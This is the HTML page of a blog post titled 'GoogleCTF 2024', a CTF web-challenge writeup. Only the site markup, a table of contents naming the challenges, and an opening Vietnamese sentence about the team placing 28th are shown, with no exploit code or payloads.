<!DOCTYPE html>
<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  
  <meta http-equiv="content-language" content="en" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  
  <title>GoogleCTF 2024 &middot; hibwyli</title>
  <meta name="title" content="GoogleCTF 2024 &middot; hibwyli" />
  
  <meta name="description" content="Here is the GoogleCTF writeups" />
  <meta name="keywords" content="Web, " />
  
  
  <link rel="canonical" href="//localhost:1313/posts/googlectf/" />
  
  
  
  
  
  
  
  
  
  
  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.857ec6700dbdcae3e112eba9fc29e3aa948366934f76d502f60b6a3e436e12e2f10925d27f3032ad87f18cbcaddb981eca1fa59d74de83da90ade26f5faf75dd.css"
    integrity="sha512-hX7GcA29yuPhEuup/CnjqpSDZpNPdtUC9gtqPkNuEuLxCSXSfzAyrYfxjLyt25geyh&#43;lnXTeg9qQreJvX6913Q==" />
  
  
  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
  
  
  
  
  
  
  
  
  
  
  
  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.984038b35a762692ece6c2038acfa3c9b3eb54655e7bd4838c6ccd3ec0fa375df9477c7a5e2cb6212e4e6847a8b6b8aca64624df0467a3d4d876528de8846064.js"
    integrity="sha512-mEA4s1p2JpLs5sIDis&#43;jybPrVGVee9SDjGzNPsD6N135R3x6Xiy2IS5OaEeotrispkYk3wRno9TYdlKN6IRgZA==" data-copy="" data-copied=""></script>
  
  
  
  <script src="/lib/zoom/zoom.min.37d2094687372da3f7343a221a470f6b8806f7891aa46a5a03966af7f0ebd38b9fe536cb154e6ad28f006d184b294525a7c4054b6bbb4be62d8b453b42db99bd.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S&#43;Yti0U7QtuZvQ=="></script>
  
  
  
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
  <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  
  <meta property="og:url" content="//localhost:1313/posts/googlectf/">
  <meta property="og:site_name" content="hibwyli">
  <meta property="og:title" content="GoogleCTF 2024">
  <meta property="og:description" content="GoogleCTF writeups">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-06-25T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-06-25T00:00:00+00:00">
    <meta property="article:tag" content="Web">
    <meta property="og:image" content="//localhost:1313/posts/googlectf/features.png">

  
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="//localhost:1313/posts/googlectf/features.png">
  <meta name="twitter:title" content="GoogleCTF 2024">
  <meta name="twitter:description" content="GoogleCTF writeups">

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "GoogleCTF 2024",
    "headline": "GoogleCTF 2024",
    "description": "GoogleCTF writeups",
    "abstract": "Here is the GoogleCTF writeups",
    "inLanguage": "en",
    "url" : "\/\/localhost:1313\/posts\/googlectf\/",
    "author" : {
      "@type": "Person",
      "name": ""
    },
    "copyrightYear": "2024",
    "dateCreated": "2024-06-25T00:00:00\u002b00:00",
    "datePublished": "2024-06-25T00:00:00\u002b00:00",
    
    "dateModified": "2024-06-25T00:00:00\u002b00:00",
    
    "keywords": ["Web"],
    
    "mainEntityOfPage": "true",
    "wordCount": "4400"
  }]
  </script>


  
  
  
  
  

<script src="/lib/jquery/jquery.slim.min.7d88d2a1c0c3e9cb6e435406228f7e367f4e73899f6aed88884f0a8b5172315e0e704494b7cd4532a9a1b197bdcd667a83a35d733ac4300a2cd4694b2c08a95a.js" integrity="sha512-fYjSocDD6ctuQ1QGIo9&#43;Nn9Oc4mfau2IiE8Ki1FyMV4OcESUt81FMqmhsZe9zWZ6g6NdczrEMAos1GlLLAipWg=="></script>






















  
  



  
  
  <meta name="theme-color"/>
  
  
</head>
<body
  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
  <div id="the-top" class="absolute flex self-center">
    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
      href="#main-content"><span
        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
  </div>
  
  
  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
    
    <div class="flex flex-1 items-center justify-between">
        <nav class="flex space-x-3">

            
            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">hibwyli</a>
            

        </nav>
        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">

            
            
            
  <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="Posts">
        Posts
    </p>
</a>



            
            
  <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="About">
        About
    </p>
</a>



            
            
  <a href="/categories/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="Categories">
        Categories
    </p>
</a>



            
            
  <a href="/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="Tags">
        Tags
    </p>
</a>



            
            

            


            
            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            


            
            
            <div
                class="ltr:mr-14 rtl:ml-14 flex items-center">
                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
                    <div class="flex items-center justify-center dark:hidden">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                    </div>
                    <div class="items-center justify-center hidden dark:flex">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                    </div>
                </button>
            </div>
            

        </nav>
        <div class="flex md:hidden items-center space-x-5 md:ml-12 h-12">

            <span></span>

            


            
            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            

            
            
            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400" style="margin-right:5px">
                <div class="flex items-center justify-center dark:hidden">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                </div>
                <div class="items-center justify-center hidden dark:flex">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                </div>
            </button>
            

        </div>
    </div>
    <div class="-my-2 -mr-2 md:hidden">

        <label id="menu-button" class="block">
            
            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>

  </span>


            </div>
            <div id="menu-wrapper" style="padding-top:5px;"
                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
                <ul
                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">

                    <li id="menu-close-button">
                        <span
                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>

</span>
                    </li>

                    

                    
  <li class="mt-1">
    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="Posts">
            Posts
        </p>
    </a>
</li>




                    

                    
  <li class="mt-1">
    <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="About">
            About
        </p>
    </a>
</li>




                    

                    
  <li class="mt-1">
    <a href="/categories/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="Categories">
            Categories
        </p>
    </a>
</li>




                    

                    
  <li class="mt-1">
    <a href="/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="Tags">
            Tags
        </p>
    </a>
</li>




                    

                </ul>
                
                <hr>
                <ul
                    class="flex mt-4 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">


                    
                    <li class="mb-1">
                        <a href="/tags/pwnable/"  class="flex items-center">
                            
                            <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="Pwnable">
                                Pwnable
                            </p>
                        </a>
                    </li>
                    
                    <li class="mb-1">
                        <a href="/tags/web/"  class="flex items-center">
                            
                            <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="Web">
                                Web
                            </p>
                        </a>
                    </li>
                    
                    <li class="mb-1">
                        <a href=""  class="flex items-center">
                            
                            <span  class="mr-3" >
                                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>


                            </span>
                            
                            <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="">
                                Write up
                            </p>
                        </a>
                    </li>
                    

                </ul>
                
                

            </div>
        </label>
    </div>
</div>


<div class="main-menu flex pb-3 flex-col items-end justify-between md:justify-start space-x-3" >
    <div class="hidden md:flex items-center space-x-5">
        
        <a href="/tags/pwnable/"  class="flex items-center">
            
            <p class="text-xs font-light text-gray-500 hover:text-gray-900" title="Pwnable">
                Pwnable
            </p>
        </a>
        
        <a href="/tags/web/"  class="flex items-center">
            
            <p class="text-xs font-light text-gray-500 hover:text-gray-900" title="Web">
                Web
            </p>
        </a>
        
        <a href=""  class="flex items-center">
            
            <span  class="mr-1" >
                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>


            </span>
            
            <p class="text-xs font-light text-gray-500 hover:text-gray-900" title="">
                Write up
            </p>
        </a>
        
    </div>
</div>




  
  <div class="relative flex flex-col grow">
    <main id="main-content" class="grow">
      


<article>
  
  
  
  
  
  


<div id="hero" class="h-[150px] md:h-[200px]"></div>



    
    <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
    style="background-image:url(/posts/googlectf/features.png);">
    


    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
    </div>
    <div
        class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
    </div>
</div>

<div id="background-blur" class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
<script>
    window.addEventListener('scroll', function (e) {
        var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
        var background_blur = document.getElementById('background-blur');
        background_blur.style.opacity = (scroll / 300)
    });
</script>

  
  

  <header id="single_header" class="mt-5 max-w-prose">
    
    <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
  
  
    
  
    
  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/"
      >hibwyli</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline ">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/posts/"
      >Posts</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/posts/googlectf/"
      >GoogleCTF 2024</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

</ol>


    
    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
      GoogleCTF 2024
    </h1>
    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
      





  
  







  







  













<div class="flex flex-row flex-wrap items-center">
  
  
  <time datetime="2024-06-25T00:00:00&#43;00:00">25 June 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">21 mins</span>
  

  
  
</div>


<div class="flex flex-row flex-wrap items-center">
  
  
  
  
     <div style="cursor: pointer;" onclick="window.open(&#34;/authors/shin24/&#34;,'_self');return false;">Shin24</div>
  
  
  
  
  
  
  
  
  
  
</div>




<div class="flex flex-row flex-wrap items-center">
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/writeup/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Writeup
  </span>
</span>
  </span>
  
  
  
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/web/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Web
  </span>
</span>
  </span>
  
  
  
  
</div>




    </div>

    
    
    
    
    

    

    
      
      
        
        
<div class="flex author">
  
  <div class="place-self-center">
    
    
    <div class="text-2xl sm:text-lg">
</div>
  </div>
</div>

      

      
        

      
      <div class="mb-5"></div>
      

    

  </header>
  
  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
    
     <div
      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-10">

         <details open id="TOCView"
  class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#sappy">SAPPY</a></li>
    <li><a href="#grand-prix-heaven">GRAND PRIX HEAVEN</a>
      <ul>
        <li><a href="#tldr">TL;DR</a></li>
        <li><a href="#writeup">Writeup</a></li>
      </ul>
    </li>
    <li><a href="#postviewer-v3">POSTVIEWER V3</a>
      <ul>
        <li><a href="#safeframerender">safeFrameRender</a></li>
        <li><a href="#race-condition">Race condition</a></li>
        <li><a href="#double-race-condition">Double race condition</a></li>
        <li><a href="#strictoriginisolation">StrictOriginIsolation</a></li>
        <li><a href="#exploit">Exploit</a></li>
      </ul>
    </li>
    <li><a href="#game-arcade">GAME ARCADE</a>
      <ul>
        <li><a href="#messagechannel">MessageChannel</a></li>
        <li><a href="#shimhtml">shim.html</a></li>
        <li><a href="#password-game">password game</a></li>
        <li><a href="#firefox">Firefox???</a></li>
      </ul>
    </li>
    <li><a href="#in-the-shadows">IN-THE-SHADOWS</a>
      <ul>
        <li><a href="#unintended---lazy-loading">Unintended - lazy loading</a></li>
        <li><a href="#intended---chromium-bug">Intended - Chromium bug</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</details>
<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
  <summary
    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#sappy">SAPPY</a></li>
    <li><a href="#grand-prix-heaven">GRAND PRIX HEAVEN</a>
      <ul>
        <li><a href="#tldr">TL;DR</a></li>
        <li><a href="#writeup">Writeup</a></li>
      </ul>
    </li>
    <li><a href="#postviewer-v3">POSTVIEWER V3</a>
      <ul>
        <li><a href="#safeframerender">safeFrameRender</a></li>
        <li><a href="#race-condition">Race condition</a></li>
        <li><a href="#double-race-condition">Double race condition</a></li>
        <li><a href="#strictoriginisolation">StrictOriginIsolation</a></li>
        <li><a href="#exploit">Exploit</a></li>
      </ul>
    </li>
    <li><a href="#game-arcade">GAME ARCADE</a>
      <ul>
        <li><a href="#messagechannel">MessageChannel</a></li>
        <li><a href="#shimhtml">shim.html</a></li>
        <li><a href="#password-game">password game</a></li>
        <li><a href="#firefox">Firefox???</a></li>
      </ul>
    </li>
    <li><a href="#in-the-shadows">IN-THE-SHADOWS</a>
      <ul>
        <li><a href="#unintended---lazy-loading">Unintended - lazy loading</a></li>
        <li><a href="#intended---chromium-bug">Intended - Chromium bug</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</details>

<script>

  var margin = 200;
  var marginError = 50;

  (function () {
    var $window = $(window);
    var $toc = $('#TOCView');
    var tocHeight = $toc.height();

    function onResize() {
      var windowAndMarginHeight = $window.height() - margin;
      if(tocHeight >= windowAndMarginHeight) {
        $toc.css("overflow-y", "scroll")
        $toc.css("max-height", (windowAndMarginHeight + marginError) + "px")
      } else {
        $toc.css("overflow-y", "hidden")
        $toc.css("max-height", "9999999px")
      }
    }

    $window.on('resize', onResize);
    $(document).ready(onResize);
  })();



</script>
   </div>
      </div>
      

      <div class="min-w-0 min-h-0 max-w-fit">
        
        


        <div class="article-content max-w-prose mb-20">
          <p>Cuối tuần vừa rồi, mình có chơi CTF với CoSGang a.k.a The Council of Sheep và đạt được thứ hạng <strong>#28</strong></p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/6d5221d6-763b-424a-892c-636727557efe" alt="image" />
    
  </figure>
</p>
<p>
  <figure>
